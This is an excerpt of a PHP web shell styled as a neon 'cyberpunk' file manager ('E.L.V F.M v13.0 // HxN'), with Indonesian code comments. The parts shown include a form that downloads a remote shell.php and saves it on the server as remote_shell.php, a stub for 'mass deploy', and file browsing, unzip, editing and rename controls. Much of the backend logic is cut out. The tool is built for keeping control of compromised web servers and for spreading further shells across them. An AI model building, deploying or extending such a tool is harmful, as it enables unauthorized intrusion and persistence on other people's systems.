                                <input type="text" name="remote_url" value="https://raw.githubusercontent.com/shell/master/shell.php" placeholder="https://example.com/shell.php" style="border-color:var(--neon-cyan);">
                            </div>
                            <div style="margin-bottom:8px;">
                                <label style="color:var(--text-secondary); font-size:10px;">SAVE AS</label>
                                <input type="text" name="url_filename" value="remote_shell.php" placeholder="output.php" style="border-color:var(--neon-cyan);">
                            </div>
                            <button type="submit" name="do_bypass_url" class="btn-cyan-glow" style="border-color:var(--neon-cyan); color:var(--neon-cyan); box-shadow:var(--neon-cyan-glow); width:100%;">[ FETCH & SAVE ]</button>
                        </form>
                    </div>
                </div>
            </div>
        <?php }
        // ==========================================
        // --- MASS DEPLOY HASIL (POST) ---
        // ==========================================
        elseif(isset($_POST['mass_deploy'])) {
            // Sudah di-handle di atas, tinggal nampilin output
            // Tapi kalo sampai sini, artinya mode lain, lewatin aja
        }
...
<!-- ===== BREADCRUMB ===== -->
        ...
        <div style="margin-bottom:12px; text-align:right; border:1px dashed var(--neon-cyan); padding:8px; border-radius:4px; background:rgba(0,229,255,0.03);">
            ...
            <table>
                ...
                <tbody>
                    ...
                    foreach ($sorted_items as $item):
                        $icon = $item['is_link'] ? '🔗' : ($item['is_dir'] ? '📁' : '📄');
                        $size_display = $item['is_dir'] ? '–' : formatSize($item['size']);
                        $suffix = '';
                        if ($item['is_link']) {
                            $suffix = ' <span style="color:var(--neon-orange); font-size:10px;">→ ' . htmlspecialchars($item['link_target']) . '</span>';
                        }
                    ...
                    <tr>
                        ...
                        <td class="col-act">
                            <?php if($item['name'] !== '..'): ?>
                                <!-- ===== FIX: Unzip di navigasi action (tombol UNZIP) ===== -->
                                ...
                                <!-- ===== NEW: Unzip button for .zip files di navigasi ===== -->
                                <?php if(!$item['is_dir'] && preg_match('/\.zip$/i', $item['name'])): ?>
                                <form method="post" style="display:inline-block;">
                                    <input type="hidden" name="c_path" value="<?= $item['path'] ?>">
                                    <button type="submit" name="unzip_f" class="btn-act-small" style="color:var(--neon-orange); font-size:10px; padding:2px 4px;" title="UNZIP HERE">UNZIP</button>
                                </form>
                                <?php endif; ?>
                            <?php else: ?>
                            <span style="color:var(--text-dim);">–</span>
        ...
        <div style="margin-top:16px;">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
                <h3 style="color:var(--neon-cyan); margin:0; text-shadow:0 0 8px rgba(0,229,255,0.4);">[ EDITING ] <?= htmlspecialchars(basename($edit_path)) ?></h3>
            ...
            <form method="post">
                ...
                <textarea id="code_editor" name="f_cnt" style="width:100%; min-height:400px; background:rgba(0,229,255,0.03); border:1px solid var(--border-subtle); color:var(--text-primary); padding:15px; font-family:'Share Tech Mono',monospace; font-size:13px; border-radius:5px; outline:none; resize:vertical;"><?= $file_content ?></textarea>
        ...
        ?>
        <div style="border:2px solid var(--neon-yellow); background:rgba(255,215,0,0.03); padding:16px; border-radius:6px; margin-top:16px;">
            <h3 style="color:var(--neon-yellow); margin-top:0; text-shadow:0 0 8px rgba(255,238,0,0.4);">RENAME ITEM</h3>
            <div class="neon-divider-thin"></div>
            <form method="post" style="display:flex; gap:10px; align-items:center; margin-top:12px;">
                ...
                <button type="submit" name="rename" class="btn-cyan-glow" style="border-color:var(--neon-yellow); color:var(--neon-yellow); box-shadow:var(--neon-yellow-glow);">RENAME</button>
        ...
        <div class="glow-static">
            <span style="color:var(--neon-cyan); text-shadow:0 0 8px rgba(0,229,255,0.5), 0 0 16px rgba(0,229,255,0.2);">E.L.V F.M v13.0</span> 
            <span style="color:var(--text-dim);">//</span> 
            <span style="color:var(--neon-purple-bright); text-shadow:0 0 8px rgba(138,43,226,0.5), 0 0 16px rgba(138,43,226,0.2);">HxN</span> 
            <span style="color:var(--text-dim);">//</span> 
            <span style="color:var(--neon-magenta); text-shadow:0 0 8px rgba(255,0,255,0.4), 0 0 16px rgba(255,0,255,0.2);">CYBERPUNK METROCITY NIGHT</span>
        </div>
    </div>
    ...
    // === LIGHT NEON PARTICLES ===
    (function() {
        const canvas = document.createElement('canvas');
        canvas.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:1;pointer-events:none;opacity:0.45;';
        ...
        resize();
        const particles = [];
        const colors = ['0,229,255', '138,43,226', '255,0,255', '0,255,136', '255,20,147', '255,215,0', '255,102,0', '255,0,68'];
        for (let i = 0; i < 70; i++) {
            particles.push({
            ...
            for (let i = 0; i < particles.length; i++) {
                for (let j = i + 1; j < particles.length; j++) {
                    ...
                    if (dist < 180) {
                        ...
                        ctx.strokeStyle = `rgba(138,43,226,${0.1 * (1 - dist/180)})`;
                        ctx.lineWidth = 0.5;
                        ctx.stroke();
                    }
                }
    ...
    setInterval(() => {
        ...
        if (footer) {
            ...
            span.style.cssText = 'color:var(--neon-cyan); font-size:10px; margin-left:14px; text-shadow:0 0 6px rgba(0,238,255,0.4);';
